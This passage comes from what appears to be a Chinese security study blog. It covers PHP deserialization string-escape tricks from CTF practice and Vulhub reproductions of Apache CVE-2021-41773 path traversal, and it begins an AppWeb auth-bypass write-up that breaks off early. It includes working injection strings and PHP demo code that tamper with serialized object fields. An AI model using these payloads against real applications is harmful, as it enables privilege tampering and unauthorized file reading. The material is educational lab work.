<p>此时如果有一个过滤函数，并将反序列后的字符串带入执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hacker&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>注意对比上面两者的输出结果，会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:5:&quot;admin&quot;;</span><br><span class="line">s:5:&quot;hacker&quot;;</span><br><span class="line"></span><br><span class="line">明显下面hacker长度为6，大于5，按理来说这是不应该的。这就是漏洞所在</span><br></pre></td></tr></table></figure></p>
<p>这时候<code>admin</code>（被过滤的）就是我们的可控变量，假设我们需要把vip属性变为1。 对比现有的子串和目标子串(部分比较)： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125; // 现有</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125; // 目标</span><br></pre></td></tr></table></figure></p>
<p>我们可以要在admin这个可控变量的位置，<strong>注入目标子串</strong></p>
<p>计算目标字串的长度： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125; //长度42</span><br></pre></td></tr></table></figure></p>
<p>也就是需要逃逸的字符串长度为42，每次admin过滤后都变为hacker，也就是每有一个admin，过滤后长度都会增加1。利用这个漏洞，我们输入42个admin，这样子过滤后字符串长度就会增加42，因此可控变量修改为： <code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:3:"123";s:3:"vip";i:1;&#125;</code></p>
<p>完整程序如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hacker&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_ser_filter</span> = filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">252</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:3:&quot;</span><span class="number">111</span><span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>发现有42个hacker，长度正好与252对应。</p>
<blockquote>
<p>反序列化后，多余的字串会被抛弃。而password（不在username里面的）就会被抛弃。</p>
</blockquote>
<p>将这个结果反序列化得到如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(User)#2 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(252) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [&quot;vip&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意看密码与我们输入的password不同，而是与username里面的password相同；并且，vip字段也修改为1。</p>
<blockquote>
<p>解释：username=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:3:"111";s:3:"vip";i:1;} 长度为252；而username=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker 长度也是252 因此系统将所有的hack接收为username之后正好达到了username的长度，所以会将";s:8:"password";s:3:"111";s:3:"vip";i:1;}放到password字段。注意，这里前面的<strong><code>";</code>正好将username闭合</strong>，然后后面的s:8:"password";s:3:"111";s:3:"vip";i:1;}<strong>正好又符合password和vip属性的反序列化要求</strong>，就会被当作password和vip属性进行反序列化，<strong><code>;</code>将vip属性闭合</strong>，<strong><code>&#125;</code>将序列化后的子串闭合</strong>，这样子就形成一个完整的序列化对象，而后面的"111"就会被抛弃。</p>
</blockquote>
<p>注意：一定要闭合：属性之间的闭合用<code>;</code>，闭合序列化对象用的是<code>&#125;</code>。</p>
<h2 id="过滤后字符变少">5.2 过滤后字符变少</h2>
<p>主体和上面一样，区别就是过滤函数变为如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对比过滤前后的字符串： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span><br><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为过滤的时候，将<strong>5</strong>个字符删减为了<strong>4</strong>个，所以和上面字符变多的情况相反，随着加入的<strong>admin</strong>的数量增多，<strong>现有子串</strong>后面会缩进来。</p>
<p>计算以下目标字串长度： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;  </span><br><span class="line">//长度42</span><br></pre></td></tr></table></figure></p>
<p>计算到<strong>下一个可控变量</strong>（这里是password）的字符串（称为缩进串）长度： ^184190 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;</span><br><span class="line">// 长度为22</span><br></pre></td></tr></table></figure></p>
<p>因为每次过滤都会减少一个字符，因此减少22个字符就能将上面的缩进串缩进username属性里面 （注意，这里演示所以每次就减少一个字符串，可能一次减少3个字符串，此时需要8个，也就是缩短了24个字符，我们输入的时候多输入2个字符，让其缩进到前一个属性即可） ^8660cb</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。<strong>所以需要闭合！闭合！闭合！</strong></p>
<p>分析：这里s指定的长度是110，而从第一个双引号开始的105个字符为：<code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:3:"</code>，这字符串会被当作username属性值。</p>
<p><strong>重点</strong>：所以<code>111</code>就成为了可控变量，也就是我们输入的password变为了可控变量。将111替换为我们的目标字串即可，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>, <span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="comment">//var_dump(unserialize(filter($a_ser)));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
<p>会发现报错了，其实这里有一个细节：</p>
<p><strong>细节</strong>：替换之前我们的输入的密码为111，只有3位数，因此我们缩进串的长度只有22，而替换为目标子串后，“password”的长度为42，此时的缩进串长度为23，所以我们需要有23个admin。最终代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>, <span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>); </span><br><span class="line">var_dump(unserialize(filter(<span class="variable">$a_ser</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="keyword">object</span>(User)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">115</span>) <span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">  [<span class="string">&quot;vip&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结">5.3 总结</h2>
<p>两种情况是不一样的，前者是把目标子串写在第一个变量，然后让第一个变量变长，挤走原先的第二个变量，让目标子串占据第二变量的位置从而被反序列化。而后者是把目标子串写在第二变量，然后让第一变量长度变短，将[[#^184190|缩进串]]缩进到第一变量里面，然后把目标子串占据第二变量的位置从而被反序列化。</p>
<p>两者都要注意：<strong>闭合</strong>；</p>
<p>后者还需要注意</p>
<ol type="1">
<li>缩进串长度的变化</li>
<li>不能够正好将缩进串缩到前一个变量的情况</li>
</ol>
<p>bugku_newphp运用到了这个知识点。</p>
<h1 id="属性中含有数组该如何反序列化">6 属性中含有数组该如何反序列化</h1>
<p>编写如下测试代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">Array</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> Test2;</span><br><span class="line">print_r(serialize(<span class="variable">$test1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">print_r(serialize(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;&#125;  </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此，如果需要在序列化中提交数组，需要注意这一点，不仅需要闭合双引号，还要把<code>&#123;&#125;</code>也给闭合了。</p>
<p>例题：<a href="0CTF%202016%20piapiapia.md">0CTF 2016 piapiapia</a></p>
<h1 id="序列化后的属性顺序">7 序列化后的属性顺序</h1>
<p>编写代码测试： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果将属性颠倒一下，其余不变 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>得到的结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>结论</strong>：从以上实验可以看出，编写类的时候属性的先后顺序就是序列化后字符串中属性的先后顺序。</p>
<p>例题：<a href="0CTF%202016%20piapiapia.md">0CTF 2016 piapiapia</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
<ul>
<li><p>版本等于2.4.49</p></li>
<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
</ul>
<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
</ul>
<p>路径：</p>
<ul>
<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
</ul>
<p>运行漏洞环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>进入环境，显示如下则环境搭建成功。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
<p>成功得到文件的内容，因此证明存在此漏洞。</p>
<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
<p>接下来改变请求的方式，发送如下请求：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
<p>成功执行命令。</p>
<h1 id="总结">总结</h1>
<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>basic 传统HTTP基础认证</li>
<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>form 表单认证</li>
</ul>
